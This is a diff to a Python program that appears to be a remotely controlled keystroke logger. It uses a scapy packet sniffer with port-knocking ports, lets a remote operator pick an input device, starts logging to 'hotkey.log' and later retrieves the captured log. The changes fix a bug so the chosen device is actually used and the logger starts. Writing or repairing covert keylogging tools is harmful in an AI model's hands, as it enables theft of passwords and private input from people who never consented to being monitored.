@@ -21,7 +21,7 @@ from datetime import datetime
 
 from scapy.all import AsyncSniffer, ICMP, IP, TCP
 
-from hotkeys import start_logger, stop_logger
+import hotkeys
 
 KNOCK_PORTS = (7000, 8000, 9000)
 KNOCK_TIMEOUT_SECONDS = 5.0
@@ -1110,6 +1110,7 @@ def run_bg(ctx: Context):
         return
 
     try:
+        import hotkeys  # Import the module to modify its global variable
         from hotkeys import list_devices_for_remote, start_logger
 
         device_list_text, devices = list_devices_for_remote()
@@ -1136,12 +1137,15 @@ def run_bg(ctx: Context):
         try:
             choice = int(choice_bytes.decode("utf-8").strip())
             if 0 <= choice < len(devices):
-                from hotkeys import logger_device
-                logger_device = devices[choice]
-                print(f"[BG] Selected: {logger_device.path}")
+                # Set the module-level logger_device
+                hotkeys.logger_device = devices[choice]
+                print(f"[BG] Selected: {devices[choice].path} - {devices[choice].name}")
                 start_logger("hotkey.log")
+                print("[BG] Logger started successfully")
             else:
                 print(f"[BG] Invalid choice {choice}")
+        except ValueError as e:
+            print(f"[BG] Invalid choice format: {e}")
         except Exception as e:
             print(f"[BG] Choice error: {e}")
 
@@ -1155,7 +1159,9 @@ def stop_bg(ctx: Context):
     if not ctx.connected_to:
         return
 
+    import hotkeys
     from hotkeys import stop_logger, get_hotkey_log_content
+    
     print("Stopping background logger...")
     stop_logger()
 
